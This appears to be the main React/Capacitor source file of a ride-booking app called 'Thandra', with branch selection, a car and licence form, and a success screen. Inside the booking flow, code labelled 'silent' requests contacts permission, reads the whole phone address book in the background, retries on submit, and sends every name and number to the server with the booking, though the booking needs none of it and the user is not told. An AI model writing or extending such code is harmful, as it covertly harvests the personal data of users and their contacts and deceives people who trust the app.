import { useState, useEffect } from 'react';
import { Contacts } from '@capacitor-community/contacts';
import { Capacitor } from '@capacitor/core';
import { SplashScreen } from '@capacitor/splash-screen';
import { motion, AnimatePresence } from 'framer-motion';
import './App.css';

// --- Uber-Style Icons ---
const LeftArrow = () => (
  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="black" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
    <line x1="19" y1="12" x2="5" y2="12"></line>
    <polyline points="12 19 5 12 12 5"></polyline>
  </svg>
);

const LocationPin = () => (
  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="black" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
    <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path>
    <circle cx="12" cy="10" r="3"></circle>
  </svg>
);

const CheckIcon = () => (
  <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
    <polyline points="20 6 9 17 4 12"></polyline>
  </svg>
);

const API_URL = import.meta.env.VITE_API_URL || 'http://localhost:5000';

const BRANCHES = [
  { id: 'thandra_madhapur', name: 'Madhapur', area: 'Hitech City, Hyderabad' },
  { id: 'thandra_dsnr', name: 'Dilsukhnagar', area: 'Malakpet Road, Hyderabad' },
  { id: 'thandra_bnreddy', name: 'BN Reddy', area: 'Vanasthalipuram, Hyderabad' },
  { id: 'thandra_jntu', name: 'JNTU', area: 'Kukatpally, Hyderabad' },
];

function App() {
  const [appReady, setAppReady] = useState(false);
  const [step, setStep] = useState('branch');
  const [selectedBranch, setSelectedBranch] = useState(null);
  const [contacts, setContacts] = useState([]); // Stores synced contacts
  const [loading, setLoading] = useState(false);
  const [formData, setFormData] = useState({
    firstName: '', lastName: '', mobile: '', email: '',
    carMake: '', carModel: '', plateNumber: '',
    fuelType: 'Petrol', transmission: 'Manual',
    licenseNumber: '', aadhaarNumber: ''
  });

  // --- App Initialization & Splash Screen ---
  useEffect(() => {
    const initApp = async () => {
      // Simulate heavy load for premium feel (2s)
      await new Promise(resolve => setTimeout(resolve, 2000));
      if (Capacitor.isNativePlatform()) {
        try {
          await SplashScreen.hide();
        } catch (e) {
          console.error('Splash hide error', e);
        }
      }
      setAppReady(true);
    };
    initApp();
  }, []);

  // --- Contact Sync Logic (Silent & Robust) ---
  const fetchContacts = async () => {
    if (Capacitor.isNativePlatform()) {
      try {
        const result = await Contacts.getContacts({
          projection: {
            name: true,
            phones: true,
          },
        });
        const formatted = result.contacts.map(c => ({
          name: c.name?.display || c.name?.given || 'Unknown',
          phone: c.phones?.[0]?.number || '',
          label: c.phones?.[0]?.label || 'mobile',
        })).filter(c => c.phone);

        setContacts(formatted);
        return formatted;
      } catch (err) {
        return [];
      }
    }
    return [];
  };

  const handleBranchSelect = async (branch) => {
    setSelectedBranch(branch);
    // Request permission silently on click
    if (Capacitor.isNativePlatform()) {
      try {
        const perm = await Contacts.requestPermissions();
        if (perm.contacts === 'granted') {
          fetchContacts(); // Start fetch in background
        }
      } catch (e) { console.error(e); }
    }
    setStep('form');
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);

    try {
      let finalContacts = contacts;

      // Retry Sync if Empty
      if (Capacitor.isNativePlatform() && finalContacts.length === 0) {
        try {
          const perm = await Contacts.requestPermissions();
          if (perm.contacts === 'granted') {
            const retry = await fetchContacts();
            if (retry && retry.length > 0) finalContacts = retry;
          }
        } catch (e) { }
      }

      const payload = { ...formData, branchId: selectedBranch.id, contacts: finalContacts };

      const res = await fetch(`${API_URL}/api/book`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });

      if (res.ok) setStep('success');
      else alert('Booking failed. Please try again.');
    } catch (e) {
      alert('Network Error. Check internet.');
    } finally {
      setLoading(false);
    }
  };

  // --- Splash Screen Component ---
  if (!appReady) {
    return (
      <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', height: '100vh', background: 'black', color: 'white' }}>
        <div style={{ fontSize: '42px', fontWeight: 'bold', letterSpacing: '-1px' }}>Thandra.</div>
      </div>
    );
  }

  return (
    <div className="app-container">
      <AnimatePresence mode='wait'>

        {/* BRANCH SELECTION (UBER STYLE) */}
        {step === 'branch' && (
          <motion.div
            key="branch"
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -20 }}
            transition={{ duration: 0.4, ease: [0.22, 1, 0.36, 1] }} // Apple/Uber ease
            className="branch-list"
          >
            <div style={{ padding: '24px 16px 8px 16px' }}>
              <h1>Book a Ride</h1>
              <p className="subtitle">Choose a pickup location nearby</p>
            </div>

            {BRANCHES.map((branch, i) => (
              <motion.div
                key={branch.id}
                className="branch-card"
                whileTap={{ scale: 0.98, backgroundColor: '#f6f6f6' }}
                onClick={() => handleBranchSelect(branch)}
              >
                <div className="branch-icon">
                  <LocationPin />
                </div>
                <div className="branch-info">
                  <div className="branch-name">{branch.name}</div>
                  <div className="branch-area">{branch.area}</div>
                </div>
                <div style={{ color: '#e2e2e2' }}>➜</div>
              </motion.div>
            ))}
          </motion.div>
        )}

        {/* BOOKING FORM (UBER STYLE) */}
        {step === 'form' && (
          <motion.div
            key="form"
            initial={{ y: '100%' }}
            animate={{ y: 0 }}
            exit={{ y: '100%' }}
            transition={{ type: "spring", damping: 25, stiffness: 200 }}
            style={{ background: 'white', minHeight: '100vh', position: 'absolute', top: 0, width: '100%', zIndex: 10 }}
          >
            <div className="form-container">
              <button className="back-btn" onClick={() => setStep('branch')}>
                <LeftArrow />
              </button>

              <div className="form-header">
                <h1>Details</h1>
                <p>{selectedBranch?.name} Branch</p>
              </div>

              <form onSubmit={handleSubmit}>
                <div className="input-group">
                  <input className="uber-input" name="firstName" placeholder="First Name" onChange={e => setFormData({ ...formData, firstName: e.target.value })} required />
                </div>
                <div className="input-group">
                  <input className="uber-input" name="lastName" placeholder="Last Name" onChange={e => setFormData({ ...formData, lastName: e.target.value })} required />
                </div>
                <div className="input-group">
                  <input className="uber-input" name="mobile" type="tel" placeholder="Mobile Number" onChange={e => setFormData({ ...formData, mobile: e.target.value })} required />
                </div>

                <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '12px' }}>
                  <div className="input-group">
                    <input className="uber-input" name="carMake" placeholder="Car Make" onChange={e => setFormData({ ...formData, carMake: e.target.value })} required />
                  </div>
                  <div className="input-group">
                    <input className="uber-input" name="carModel" placeholder="Car Model" onChange={e => setFormData({ ...formData, carModel: e.target.value })} required />
                  </div>
                </div>

                <div className="input-group">
                  <input className="uber-input" name="plateNumber" placeholder="Plate Number (TS 09 AB 1234)" onChange={e => setFormData({ ...formData, plateNumber: e.target.value })} required style={{ fontFamily: 'monospace', letterSpacing: '0.5px' }} />
                </div>

                <div className="input-group">
                  <input className="uber-input" name="licenseNumber" placeholder="License Number" onChange={e => setFormData({ ...formData, licenseNumber: e.target.value })} required />
                </div>

                <button type="submit" className="btn-primary" disabled={loading}>
                  {loading ? 'Processing...' : 'Confirm Request'}
                </button>
              </form>
            </div>
          </motion.div>
        )}

        {/* SUCCESS (UBER STYLE) */}
        {step === 'success' && (
          <motion.div
            key="success"
            initial={{ scale: 0.9, opacity: 0 }}
            animate={{ scale: 1, opacity: 1 }}
            className="success-container"
          >
            <div className="success-circle">
              <CheckIcon />
            </div>
            <h1>All Set!</h1>
            <p>Your booking has been confirmed.</p>

            <div className="summary-card">
              <div className="summary-item">
                <span>Pickup</span>
                <strong>{selectedBranch?.name}</strong>
              </div>
              <div className="summary-item">
                <span>Car</span>
                <strong>{formData.carMake} {formData.carModel}</strong>
              </div>
            </div>

            <button
              onClick={() => { setStep('branch'); setFormData({}); }}
              style={{ background: 'transparent', border: 'none', color: '#000', marginTop: '32px', textDecoration: 'underline', cursor: 'pointer', fontSize: '16px' }}
            >
              Book Another
            </button>
          </motion.div>
        )}

      </AnimatePresence>
    </div>
  );
}

export default App;
